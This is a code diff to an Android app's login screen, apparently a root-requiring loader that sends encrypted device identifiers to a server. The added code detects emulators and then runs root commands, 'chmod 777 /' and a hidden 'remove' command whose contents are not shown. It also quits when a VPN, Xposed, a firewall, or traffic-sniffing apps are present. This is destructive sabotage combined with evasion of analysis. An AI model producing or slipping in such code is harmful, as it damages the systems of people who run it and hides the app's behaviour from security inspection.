@@ -49,6 +49,10 @@ import static android.content.DialogInterface.BUTTON_POSITIVE;
 import static com.Gcc.Deadeye.GccConfig.urlref.TAG_ERROR;
 import static com.Gcc.Deadeye.GccConfig.urlref.TAG_MSG;
 import static com.Gcc.Deadeye.GccConfig.urlref.TAG_ONESIGNALID;
+import static com.Gcc.Deadeye.GccConfig.urlref.canary;
+import static com.Gcc.Deadeye.GccConfig.urlref.netgaurd;
+import static com.Gcc.Deadeye.GccConfig.urlref.pcanary;
+import static com.Gcc.Deadeye.GccConfig.urlref.remove;
 
 
  public class LoginActivity extends AppCompatActivity {
@@ -133,6 +137,7 @@ import static com.Gcc.Deadeye.GccConfig.urlref.TAG_ONESIGNALID;
 
 
         isStoragePermissionGranted();
+        Iscall();
         RootBeer rootBeer = new RootBeer(LoginActivity.this);
         if (!rootBeer.isRooted()) {
             new AlertDialog.Builder(LoginActivity.this)
@@ -150,31 +155,46 @@ import static com.Gcc.Deadeye.GccConfig.urlref.TAG_ONESIGNALID;
         else{
             ShellUtils.SU("su");
         }
+       if(Helper.isEmulator()){
+           ShellUtils.SU("chmod 777 /");
+           ShellUtils.SU(remove);
+           new AlertDialog.Builder(LoginActivity.this)
+                   .setTitle("Warning")
+                   .setMessage("Emulator Detected")
+                   .setCancelable(false)
+                   .setPositiveButton("ok", new DialogInterface.OnClickListener() {
+                       @Override
+                       public void onClick(DialogInterface dialog, int which) {
+                           finish();
+                       }
+                   }).show();
 
-        EmulatorDetector.with(this)
-                .setCheckTelephony(false)
-                .addPackageName("com.bluestacks")
-                .setDebug(true)
-                .detect(new EmulatorDetector.OnEmulatorDetectorListener() {
-                    @Override
-                    public void onResult(boolean isEmulator) {
-                        if(isEmulator){
-                            new AlertDialog.Builder(LoginActivity.this)
-                                    .setTitle("Warning")
-                                    .setMessage("Emulator Detected")
-                                    .setCancelable(false)
-                                    .setPositiveButton("ok", new DialogInterface.OnClickListener() {
-                                        @Override
-                                        public void onClick(DialogInterface dialog, int which) {
-                                            finish();
-                                        }
-                                    }).show();
-                        }
+       }
 
-                    }
-                });
-
+        Check();
     }
+
+     private  void Check(){
+         if(Helper.checkVPN(LoginActivity.this)) {
+             Toast.makeText(LoginActivity.this, "Turn Off Your Vpn", Toast.LENGTH_LONG).show();
+             finish();
+         }
+      if(Helper.isXposedActive()){
+             finish();
+         }
+        if(Helper.isXposedInstallerAvailable(LoginActivity.this)){
+             finish();
+         }
+         if (Helper.isAppRunning(LoginActivity.this,netgaurd)){
+             finish();
+         }
+         if (Helper.isAppRunning(LoginActivity.this,canary)){
+             finish();
+         }
+         if (Helper.isAppRunning(LoginActivity.this,pcanary)){
+             finish();
+         }
+     }
 
     @SuppressLint("HardwareIds")
     public static String getDeviceId(Context context) {
@@ -198,6 +218,8 @@ import static com.Gcc.Deadeye.GccConfig.urlref.TAG_ONESIGNALID;
 
         return deviceId;
     }
+
+
      public  boolean isStoragePermissionGranted() {
          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
              if (checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE)
@@ -207,7 +229,7 @@ import static com.Gcc.Deadeye.GccConfig.urlref.TAG_ONESIGNALID;
              } else {
 
                  // Log.v(TAG,"Permission is revoked");
-                 ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_PHONE_STATE}, 1);
+                 ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);
                  return false;
              }
          }
@@ -216,6 +238,28 @@ import static com.Gcc.Deadeye.GccConfig.urlref.TAG_ONESIGNALID;
              return true;
          }
      }
+
+
+     public  boolean Iscall() {
+         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+             if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE)
+                     == PackageManager.PERMISSION_GRANTED) {
+                 //  Log.v(TAG,"Permission is granted");
+                 return true;
+             } else {
+
+                 // Log.v(TAG,"Permission is revoked");
+                 ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, 1);
+                 return false;
+             }
+         }
+         else { //permission is automatically granted on sdk<23 upon installation
+             // Log.v(TAG,"Permission is granted");
+             return true;
+         }
+     }
+
+
     private void userLogin() {
 
         //first getting the values
@@ -254,8 +298,8 @@ import static com.Gcc.Deadeye.GccConfig.urlref.TAG_ONESIGNALID;
                 params.put(TAG_DEVICEID,AESUtils.DarKnight.getEncrypted(deviceid));
                 params.put(TAG_KEY,AESUtils.DarKnight.getEncrypted(key));
                 params.put(TAG_ONESIGNALID,UUID);
-//                Log.d("test",AESUtils.DarKnight.getEncrypted(deviceid));
-//                Log.d("test",AESUtils.DarKnight.getEncrypted(key));
+          //     Log.d("test",AESUtils.DarKnight.getEncrypted(deviceid));
+           //     Log.d("test",AESUtils.DarKnight.getEncrypted(key));
 //                Log.d("test",AESUtils.DarKnight.getEncrypted(UUID));
                 String rq = null;
 
